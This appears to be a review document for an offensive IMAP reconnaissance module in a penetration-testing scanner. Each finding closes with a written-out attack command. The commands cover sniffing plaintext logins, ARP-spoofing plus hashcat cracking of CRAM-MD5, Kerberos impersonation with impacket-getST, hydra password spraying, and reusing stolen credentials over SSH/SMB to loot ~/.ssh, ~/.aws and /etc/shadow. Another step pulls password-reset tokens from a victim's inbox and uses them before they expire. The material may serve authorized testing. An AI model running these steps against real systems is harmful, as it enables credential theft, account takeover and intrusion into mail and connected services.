summary: IMAP module is the deepest of the mail-legacy tranche: reliable T1 posture (STARTTLS presence, LOGINDISABLED lie, SASL mech inventory, ID pre-auth leak), T1 hard-verify probes (PREAUTH greeting, plaintext-LOGIN accepted, ANONYMOUS session actually granted, CRAM/DIGEST challenge captured), T0 known-bad version banner match, and T3 credentialed-login path with mailbox inventory + loot subject-search (default-cred spray built in). Cross-transport wire feeds known_mail_accounts. Biggest gap: no LOGIN-differential timing-based enum promotion, no follow-through on GSSAPI relay (Kerberos ticket capture), and no fetch of the CRAM-MD5 response for immediate cracking (only the challenge is captured).

findings.tier_evidence: A '* PREAUTH' greeting IS the authenticated session — the socket is already logged in without any credential, giving an unauth mailbox handle.
findings.promotion_notes: Auto-run LIST/LSUB/SELECT INBOX and dump a bounded set of message headers as loot proof; harvest addresses to known_users.
findings.tester_next_step: nc IP PORT ; then: a1 LIST "" "*" ; a2 SELECT INBOX ; a3 FETCH 1:5 (BODY.PEEK[HEADER.FIELDS (SUBJECT FROM TO)])

findings.title_pattern: IMAP does not offer STARTTLS on 143/tcp
findings.tier_evidence: Enum-only: CAPABILITY did not advertise STARTTLS — a posture flag.
findings.promotion_notes: No promotion practical inside recce; requires MITM/sniff. Stays a posture finding.
findings.tester_next_step: tcpdump -i any -A 'tcp port 143 and host IP' during a real user session — every LOGIN is in clear.

findings.title_pattern: IMAP LOGIN accepted before STARTTLS (plaintext credentials)
findings.tier_evidence: Bogus LOGIN with the probe user is processed (returned NO) rather than refused with a TLS-required BAD; deterministic proof that the plaintext auth path is live.
findings.promotion_notes: Chain: run the LOGIN-differential enum sweep (already implemented) and spray captured names against common passwords for T3 mailbox access.

findings.title_pattern: IMAP STARTTLS downgrade (LOGIN accepted despite LOGINDISABLED)
findings.tier_evidence: LOGINDISABLED advertised in pre-TLS CAPABILITY but LOGIN nonetheless processed — a deterministic differential that IS the flaw.
findings.promotion_notes: Combine with a canary login to prove cred-in-clear path is exploitable, same as t1 plaintext_login.
findings.tester_next_step: openssl s_client -connect IP:143 (raw) ; a1 CAPABILITY ; a2 LOGIN user password ; note LOGINDISABLED was advertised but LOGIN worked

findings.tier_evidence: Enum-only: advertised AUTH= mechs matched against _SASL_WEAK table; severity varies (high for PLAIN/LOGIN/GSSAPI/NTLM/ANONYMOUS on cleartext, medium for CRAM/DIGEST, low for PLAIN/LOGIN over 993).
findings.promotion_notes: For CRAM-MD5/DIGEST-MD5, the sibling imap_offline_crack_channel captures the challenge (T2). For NTLM, add a Type-1/Type-2 exchange (like pop3.py) to harvest AV_PAIRs — a T2 information-disclosure primitive.
findings.tester_next_step: openssl s_client -connect IP:993 ; a1 CAPABILITY ; then for AUTH=NTLM: a2 AUTHENTICATE NTLM + base64(NTLMSSP Type-1) ; parse Type-2 AV_PAIRs (nmap --script imap-ntlm-info).

findings.tier_evidence: Presence of GSSAPI in advertised mech list; no Kerberos exchange attempted.
findings.promotion_notes: Requires an AD context — get an ST for imap/<host> via impacket-getST or use s4u2self with a compromised account, then relay to grant mailbox access.
findings.tester_next_step: impacket-getST -spn imap/mail.domain.local -impersonate 'admin' -k -no-pass 'DOMAIN/svc' ; then use the ticket via KRB5CCNAME with an IMAP client that supports GSSAPI (evolution / offlineimap with kerberos).

findings.tier_evidence: AUTHENTICATE ANONYMOUS with an arbitrary trace returned OK — a confirmed unauth mailbox session (not just advertised).
findings.promotion_notes: Auto-run LIST/SELECT INBOX to prove read access + dump message headers as loot (imap_mailbox_access + imap_loot_hits paths cover this).
findings.tester_next_step: openssl s_client -connect IP:PORT ; a1 AUTHENTICATE ANONYMOUS ; + <base64 arbitrary trace> ; then a2 LIST "" "*" ; a3 SELECT INBOX

findings.tier_evidence: Server issued an actual base64 challenge on demand — the piece required to crack a captured response is on hand (not just an advertisement).
findings.promotion_notes: Add MITM helper (ettercap/arpspoof) doc + capture-then-crack loop against a live client response. Beyond automated scanner scope.
findings.tester_next_step: arpspoof + tcpdump 'tcp port 143' to capture a real AUTHENTICATE CRAM-MD5 response, then: hashcat -m 10200 '$cram_md5$<b64_chal>$<b64_resp>' rockyou.txt

findings.title_pattern: IMAP pre-auth ID response leaks server/product info (RFC 2971)
findings.tier_evidence: Pre-auth ID reply fields captured and reported — fingerprint only.
findings.promotion_notes: Feeds imap_version_cve; no direct promotion path beyond fingerprint chaining.
findings.tester_next_step: openssl s_client -connect IP:PORT ; a1 ID NIL — read version/os/vendor fields and grep CVE DB

findings.title_pattern: Dovecot 2.3.x pre-2.3.21 / Cyrus IMAP 2.4.x or earlier
findings.tier_evidence: Regex match against banner + ID product/version — no exploit probe.
findings.promotion_notes: For CVE-2022-30550 or CVE-2019-11500 chain to a memory-disclosure proof; for Cyrus 2.4.x, use the pre-auth heap-corruption PoC. Both are destructive.
findings.tester_next_step: searchsploit dovecot 2.3 ; for Dovecot: https://dovecot.org/security.html for exact CVE ; do NOT fire memory-corruption PoC in prod without ROE.

findings.title_pattern: IMAP valid usernames enumerated via LOGIN differential
findings.tier_evidence: Concrete valid usernames extracted via LOGIN-response differential across many probes; results recorded into known_mail_accounts.
findings.promotion_notes: Feed harvested existing users into a bounded spray against common passwords via try_login — a landed pair is T3.
findings.tester_next_step: hydra -L imap_enum_users.txt -P rockyou.txt -t 4 -f imap://IP:143 ; add -e nsr to try no-password, same-as-user, reversed.

findings.tier_evidence: The default-cred spray landed a real LOGIN OK — an actual mailbox foothold (session established, credential proven).
findings.promotion_notes: Chain: pivot the same identity to SSH/SMB/AD (AD-joined mail servers commonly share creds). Already partially covered by imap_mailbox_access + imap_loot_hits.
findings.tester_next_step: Try the landed pair as: ssh <user>@IP ; smbclient -L //IP -U '<user>%<pw>' ; then loot ~/.ssh, ~/.aws, /etc/shadow if root-adjacent.

findings.title_pattern: IMAP mailbox inventory readable with credentials
findings.tier_evidence: LIST/LSUB/NAMESPACE actually enumerated — real folder structure retrieved as the authenticated user.
findings.promotion_notes: Extend to shared-mailbox / GETACL enumeration + fetch messages older than N days as bulk-loot; already partially done via _loot_search.
findings.tester_next_step: python3 -c 'import imaplib; m=imaplib.IMAP4_SSL("IP"); m.login(u,p); print(m.list()); m.select("INBOX"); print(m.search(None,"ALL"))'

findings.title_pattern: IMAP inbox contains high-value loot hits
findings.tier_evidence: Loot-shaped subjects (password reset / VPN / SSH key / MFA) actually pulled from INBOX and returned to the operator — a discovered pivot to other services.
findings.promotion_notes: Optionally fetch full BODY.PEEK on top hits (currently only headers). Trade-off: more data exposure risk.
findings.tester_next_step: After login: a1 SELECT INBOX ; a2 SEARCH SUBJECT "password reset" ; a3 FETCH <seq> (BODY.PEEK[TEXT]) to pull the reset token; use it on the origin service before it expires.
